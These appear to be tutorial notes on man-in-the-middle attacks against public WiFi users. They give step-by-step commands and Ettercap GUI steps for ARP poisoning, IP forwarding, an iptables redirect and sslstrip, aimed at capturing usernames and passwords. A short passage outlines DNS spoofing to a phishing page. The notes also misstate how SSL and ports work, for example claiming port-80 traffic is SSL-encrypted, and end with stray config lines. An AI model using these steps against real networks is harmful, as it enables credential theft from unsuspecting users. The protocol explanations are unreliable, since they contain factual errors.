
Network Attacks & MITM
----------------------
	Free WiFi
		--> CCD
		--> Railway Station
		--> Star Bucks
		--> Costa Cafe
		--> Barista
		--> Subway
	Suppose, there is an intruder in the free wifi, and he is seeing all the data you are transmitting over the network.
		Username
		Passwords

Which attack he is using?
-------------------------
	MiTM --> Man In The Middle Attack
		An intruder is listening and seeing (sniffing and spoofing) the data transmitted over by the user. In other words, The attacker is standing between the two nodes of the communication, all the data is going through the attacker's device.

ARP Poisioning
==============
	ARP --> Address Resolution Protocol
	ARP Table  ---> Maps IP Address with the MAC Address
	In this attack, the attacked poisons the ARP Cache.

Ettercap ---> It is a tool which is used for performing MiTM and ARP Poisioning attack in the network. It is pre-installed in Kali Linux.

Attack
======

1. Information Gathering
	#arp-scan --local

2. Start Ettercap
	#ettercap -G
		G ---> Graphical Version
Start MiTM Attack
	1. Goto "Sniff"
	2. Click on "Unified Sniffing"
	3. Select the interface ---> eth0
	4. Goto on "Hosts"
	5. Click on "Scan For Hosts"
	6. Goto on "Hosts"
	7. Click on "Hosts List"
		192.168.228.137 ---> Target
		Router --> Default Gateway
					#route -n
					192.168.228.2
	8. Select default gateway -->  192.168.228.2 ---> Click on "Add To Target 1"
	9. Select the Target IP Address --> 192.168.228.137 Click on "Add To Target 2"
	10. Goto "MiTM"
	11. Click on "ARP Poisioning"
	12. Check on "Sniff Remote Connections" and click on "OK"
	13. Goto "Start"
	14. Click on "Start Sniffing"

HTTP --> Hyper Text Transfer Protocol
HTTPS -> Hyper Text Transfer Protocol Secure
										|
										|--> S=Secure
												|->SSL
											Secure Socket Layer
											443

For Performing MiTM and ARP Poisioning on HTTPS websites. We need to do SSL Striping.
For Performing sslstriping, we need to perform 3 steps
	1. IP Forwarding
	2. Traffic Redirection
	3. SSL Striping

1. IP Forwarding
================
	To Step up the IP Address and listen for the traffic which is transmitted by SSL.
		#more /proc/sys/net/ipv4/ip_forward
			0
		#echo "1" > /proc/sys/net/ipv4/ip_forward
		#more /proc/sys/net/ipv4/ip_forward
			1

2. Traffic Redirection
======================
	SSL works for port 80.
	Data which is transmitted over port number 80, will be encrypted and protected by SSL. So we will redirect the data from port 80 to any random port, let's say port number 8080.
		#locate etter.conf
			/etc/ettercap/etter.conf
			/usr/share/ettercap/doc/etter.conf.5.pdf
			/usr/share/man/man5/etter.conf.5.gz
		#nano /etc/ettercap/etter.conf
			ec_uid = 0                # nobody is the default
			ec_gid = 0                # nobody is the default

			Scroll Down Until You Find Something Like This
				#---------------
				#     Linux
				#---------------
			You will find another line
			#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"

			Copy that line and paste it in notepad

			#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"

			we need to modify this command.

		iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 --> This is my commmand

		#iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

3. SSL Striping
===============
	Now all the thing is set up, we are good to go. Start the sslstriping tool and use it for port 8080

		#sslstrip -l 8080
			-l --> Listining

Now we will perform MiTM and ARP Poisioning

Start Ettercap
	#ettercap -G
		G ---> Graphical Version
Start MiTM Attack
	1. Goto "Sniff"
	2. Click on "Unified Sniffing"
	3. Select the interface ---> eth0
	4. Goto on "Hosts"
	5. Click on "Scan For Hosts"
	6. Goto on "Hosts"
	7. Click on "Hosts List"
		192.168.228.137 ---> Target
		Router --> Default Gateway
					#route -n
					192.168.228.2
	8. Select default gateway -->  192.168.228.2 ---> Click on "Add To Target 1"
	9. Select the Target IP Address --> 192.168.228.137 Click on "Add To Target 2"
	10. Goto "MiTM"
	11. Click on "ARP Poisioning"
	12. Check on "Sniff Remote Connections" and click on "OK"
	13. Goto "Start"
	14. Click on "Start Sniffing"

DNS Poisioning Attack | DNS Spoofing Attack
===========================================
It will let the user to redirect to phishing web page in the network
www.facebook.com ----> It will go to my IP ADdress where i have hosted another phishing page.

ec_gid = 4124123                # nobody is the default

make ec_uid and ec_gid as 0
